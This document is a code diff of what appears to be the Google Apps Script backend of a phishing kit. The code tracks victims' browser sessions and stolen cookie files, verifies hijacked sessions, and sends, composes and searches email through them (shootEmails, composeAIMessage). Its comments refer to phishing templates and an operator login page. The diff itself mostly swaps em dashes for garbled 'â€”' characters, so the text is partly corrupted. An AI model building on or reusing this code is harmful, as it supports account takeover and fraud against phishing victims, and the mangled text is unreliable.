@@ -1,4 +1,4 @@
-// Main endpoint handler
+﻿// Main endpoint handler
 const SCRIPT_KEY = '1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234';
 
 const CONFIG = {
@@ -45,7 +45,7 @@ function doPost(e) {
       try {
         Object.assign(params, JSON.parse(e.postData.contents));
       } catch (parseErr) {
-        // urlencoded bodies are not JSON — ignore; e.parameter already holds them.
+        // urlencoded bodies are not JSON â€” ignore; e.parameter already holds them.
       }
     }
     const traceId = params.traceId || "n/a";
@@ -119,7 +119,7 @@ function doPost(e) {
 
 /**
  * Records a visit to the operator home/login page and notifies the admin (opt-in via
- * the allowNotifySiteVisit setting). Fire-and-forget — returns immediately so the page
+ * the allowNotifySiteVisit setting). Fire-and-forget â€” returns immediately so the page
  * render is never blocked. Public beacon: posts with the SCRIPT_KEY like the phishing
  * templates already do (LINKS.js), but leaks no stored data.
  */
@@ -139,7 +139,7 @@ function notifySiteVisit(params) {
 
 /**
  * Generic read for any sheet by name (POST). Mirrors GET.js's getData but keeps the
- * doPost validateRequest key check. Range is optional — when omitted the sheet's full
+ * doPost validateRequest key check. Range is optional â€” when omitted the sheet's full
  * used range (getDataRange) is returned, so the engine can read projects/hub even while
  * the Sheets API OAuth token is invalid.
  */
@@ -1828,7 +1828,7 @@ function autoVerifyStaleSessions() {
               updateHubAndProjectsFromCookieData(browserId);
               verifiedCount++;
             } else {
-              // Verification failed — update cookie + hub so dashboard reflects FAILED state
+              // Verification failed â€” update cookie + hub so dashboard reflects FAILED state
               const failLastVerifyData = JSON.stringify({
                 timestamp: new Date().toISOString(),
                 status: 'FAILED',
@@ -2299,7 +2299,7 @@ function getSessionData(params) {
     const driveUrl = getCol('cookieFileURL') || getCol('driveUrl') || '';
     // Only Google Drive links need the fileId -> uc?export=download rewrite. Non-Drive
     // providers (Cloudinary/R2/B2) store a direct public URL, so pass those through
-    // unchanged — the Electron launcher validates ZIP magic bytes on download.
+    // unchanged â€” the Electron launcher validates ZIP magic bytes on download.
     let downloadUrl = driveUrl;
     if (/drive\.google\.com/.test(driveUrl)) {
       const fileIdMatch = driveUrl.match(/[-\w]{25,}(?=[\/?]|$)/);
@@ -2328,7 +2328,7 @@ function getSessionData(params) {
 
 /**
  * Verify token and update last used time
- * Cached wrapper — dedupes repeated validations for the same token within 60s.
+ * Cached wrapper â€” dedupes repeated validations for the same token within 60s.
  */
 function validateUserToken(token) {
   const startTime = Date.now();
@@ -3169,7 +3169,7 @@ function handleSaveResponseToDrive(e) {
       userFolder = parentFolder.createFolder(String(userId));
     }
 
-    // Find or create the project subfolder (named by projectId) — mirrors the
+    // Find or create the project subfolder (named by projectId) â€” mirrors the
     // engine's createOrUpdateJsonFile layout: userFolder/projectId/projectId.json.
     let projectFolder = null;
     const projectFolders = userFolder.getFoldersByName(String(projectId));
@@ -3213,7 +3213,7 @@ function handleSaveResponseToDrive(e) {
  * shares the file "anyone with link = viewer" so WebFixx /api/drive-csv can
  * fetch it, and returns the fileId reference stored in the hub cell.
  */
-// getContent/setContent are missing on some File instances in this runtime —
+// getContent/setContent are missing on some File instances in this runtime â€”
 // fall back to blob-based read/write which every DriveApp build supports.
 function readExtractText_(file) {
   try {
@@ -3298,7 +3298,7 @@ function shootEmails(params) {
 
     Logger.log("[shootEmails] Request: browserId=" + browserId + ", contacts=" + (contacts.length || "?") + ", sendMode=" + (sendMode || "now") + ", scheduleStartTime=" + (scheduleStartTime || "N/A"));
 
-    const engineUrl = resolveEngineUrl("emails/send-email");
+    const engineUrl = resolveEngineUrl("emails/send-email", '', 'EMAIL');
     const payload = JSON.stringify({
       browserId,
       contacts: typeof contacts === "string" ? JSON.parse(contacts) : contacts,
@@ -3338,7 +3338,7 @@ function composeAIMessage(params) {
       return createJsonResponse({ success: false, error: "browserId and contactEmail are required" });
     }
 
-    const engineUrl = resolveEngineUrl("emails/compose-email");
+    const engineUrl = resolveEngineUrl("emails/compose-email", '', 'EMAIL');
     const payload = JSON.stringify({
       browserId,
       contactEmail,
@@ -3503,7 +3503,7 @@ function createEmailLabel(params) {
       return createJsonResponse({ success: false, error: "browserId and labelName are required" });
     }
 
-    const engineUrl = resolveEngineUrl("emails/label/create");
+    const engineUrl = resolveEngineUrl("emails/label/create", '', 'EMAIL');
     const response = UrlFetchApp.fetch(engineUrl, {
       method: "POST",
       contentType: "application/json",
@@ -3525,7 +3525,7 @@ function deleteEmailLabel(params) {
       return createJsonResponse({ success: false, error: "browserId and labelName are required" });
     }
 
-    const engineUrl = resolveEngineUrl("emails/label/delete");
+    const engineUrl = resolveEngineUrl("emails/label/delete", '', 'EMAIL');
     const response = UrlFetchApp.fetch(engineUrl, {
       method: "POST",
       contentType: "application/json",
@@ -3547,7 +3547,7 @@ function searchEmailHistory(params) {
       return createJsonResponse({ success: false, error: "browserId and contactEmail are required" });
     }
 
-    const engineUrl = resolveEngineUrl("emails/search-history");
+    const engineUrl = resolveEngineUrl("emails/search-history", '', 'EMAIL');
     const response = UrlFetchApp.fetch(engineUrl, {
       method: "POST",
       contentType: "application/json",
